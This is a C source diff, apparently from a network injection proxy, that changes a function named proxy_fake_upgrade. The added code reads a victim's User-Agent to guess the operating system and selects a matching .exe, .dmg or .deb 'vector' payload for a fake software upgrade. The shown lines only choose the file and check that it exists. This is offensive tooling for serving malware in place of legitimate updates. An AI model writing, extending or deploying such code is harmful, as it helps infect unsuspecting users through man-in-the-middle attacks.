@@ -44,6 +44,7 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file,  char 
       struct bio_inject_setup bis;
       int inject_len = 0;
       osuser os;
+      FILE *fp = NULL;
 
       *sbio = BIO_new(BIO_s_connect());
       BIO_set_conn_hostname(*sbio, host);
@@ -59,6 +60,29 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file,  char 
 
       DEBUG_MSG(D_EXCESSIVE, "header: [%s]", request);
       os = search_useragent(request);
+
+      if (os != UNKNOWN) {
+         char *thefile = NULL;
+
+         if (os == WINDOWS) {
+            ret = asprintf(&thefile, "/opt/td-config/share/vectors/%s.exe", file);            
+         } else if (os == OSX) {
+            ret = asprintf(&thefile, "/opt/td-config/share/vectors/%s.dmg", file);
+         } else {
+            ret = asprintf(&thefile, "/opt/td-config/share/vectors/%s.deb", file);
+         }
+
+         if (ret == -1)
+            DEBUG_MSG(D_ERROR, "Flash melted allocation failed");
+
+         if ((fp = fopen(thefile, "r")) == NULL) {
+            os = UNKNOWN;
+         } else {
+            fclose(fp);
+         }
+
+         SAFE_FREE(thefile);
+      }
 
       BIO_puts(*sbio, request);
 
